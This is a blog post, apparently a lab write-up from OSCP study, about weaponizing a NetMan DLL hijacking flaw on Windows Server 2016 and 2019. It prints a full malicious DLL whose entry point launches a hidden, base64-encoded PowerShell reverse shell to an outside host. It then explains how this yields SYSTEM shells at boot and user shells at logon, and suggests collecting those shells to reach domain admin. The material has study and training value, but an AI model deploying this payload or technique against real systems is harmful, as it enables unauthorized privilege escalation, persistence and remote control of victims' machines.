<H1>Weaponizing NetMan DLL Hijacking gone wrong?</H1>  

<p>In my hunt for OSCP certificate I was going through Windows Priviledge escalation techniques. Specifically DLL hijacking. I stumbled upon an <a href="https://twitter.com/itm4n">@itm4n</a>'s great article about <a href="https://itm4n.github.io/windows-server-netman-dll-hijacking/">NetMan DLL Hijacking</a>.</p>

<p>His article explains how all editions of Windows Server, from 2008R2 to 2019 should be prone to DLL Hijacking because of missing DLL if we have an account with permissions to write into %PATH%. I won't explain everything in detail here, go read his <a href="https://itm4n.github.io/windows-server-netman-dll-hijacking/">article</a>.</p>  

<p>So I thought I will give it a shot and will try to exploit this with his POC. I compiled malicious DLL:</p>

```cpp

// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"

// Standard dllmain api entry created by VS
BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        // Our malicious code.
        WinExec("powershell -nop -noni -w Hidden -ep Bypass -e JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAYwBwAEMAbABpAGUAbgB0ACgAIgAxADAALgAwAC4AMgAuADYAIgAsADQANAAzACkACgAkAHMAPQAkAGMALgBHAGUAdABTAHQAcgBlAGEAbQAoACkACgAkAHMAYgA9ACgAWwBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACIAUABTACAAIgArACgAcAB3AGQAKQAuAFAAYQB0AGgAKwAiAD4AIAAiACkACgAkAHMALgBXAHIAaQB0AGUAKAAkAHMAYgAsADAALAAkAHMAYgAuAEwAZQBuAGcAdABoACkACgBbAGIAeQB0AGUAWwBdAF0AJABiAD0AMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQAKAHcAaABpAGwAZQAoACgAJABpAD0AJABzAC4AUgBlAGEAZAAoACQAYgAsADAALAAkAGIALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7AAoAIAAgACAAIAAkAGQAPQAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAHQAIABUAGUAeAB0AC4AVQBUAEYAOABFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiACwAMAAsACQAaQApAAoAIAAgACAAIAAkAHMAYgA9ACgAaQBlAHgAIAAkAGQAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwApACAAMgA+ACYAMQAKACAAIAAgACAAJABzAGIAMgA9ACQAcwBiACsAIgBQAFMAIAAiACsAKABwAHcAZAApAC4AUABhAHQAaAArACIAPgAgACIACgAgACAAIAAgACQAcwBiAD0AKABbAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGIAMgApAAoAIAAgACAAIAAkAHMALgBXAHIAaQB0AGUAKAAkAHMAYgAsADAALAAkAHMAYgAuAEwAZQBuAGcAdABoACkACgAgACAAIAAgACQAcwAuAEYAbAB1AHMAaAAoACkACgB9AAoAJABjAC4AQwBsAG8AcwBlACgAKQA=", SW_HIDE);
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```
<p>In this DLL payload is base64 encoded PS reveverse shell. Next I compiled <a href="https://twitter.com/itm4n">@itm4n</a>'s Trigger POC code into an executable. On Windows Server 2016 I created C:\Folder and added it into %PATH%. Logged in VDI as low-level user, copied my malicious wlanapi.dll into C:\Folder and ran NetManTrigger.exe and...</p>

<H3>Nothing...</H3>

<p>So i though something must be wrong. I executed only powershell payload. It worked. So next step was to verify if trigger really restarts the service and it loads our DLL. Here is output of procmon: </p>
<a href="https://raw.githubusercontent.com/AwokenSec/awokensec.github.io/master/Images/procmon.png">
<img src="/Images/procmon.png" alt="Procmon">
</a>
<p>DLL is loaded with NT Authority\System. But no reverse shell. I was sure my maliciuos DLL is working fine cos i verified with another application. So I went for a reboot and let's try again. When i was logging in again I saw I got a reverse shell in my Kali:</p>

<a href="https://github.com/AwokenSec/awokensec.github.io/blob/master/Images/revshell.PNG?raw=true">
<img src="/Images/revshell.PNG" alt="revshell">
</a>

<p>I got a shell everytime a user logs in as him. I did not managed to get the NetManTrigger to work for me. In Procmon i see DLL get loaded but it seems like my code is not executed. I also tried to proxy with original DLL which is present on Windows 10 but got the same result.</p>

<p>I was able to replicate same behavior on Windows Server 2019. The only difference is that in server 2019 after reboot i got NT Authority\System shell when system boots. And of course a shell when user logs in. In Windows Server 2012 this unfortunetely did not work.<p/>

<p>Well, this is a pretty different outcome than what i was going for. Instead of getting local admin triggered on demand, we can collect user shells as they log in and go for domain admin, or in case of Server 2019 at least reboot for local admin.

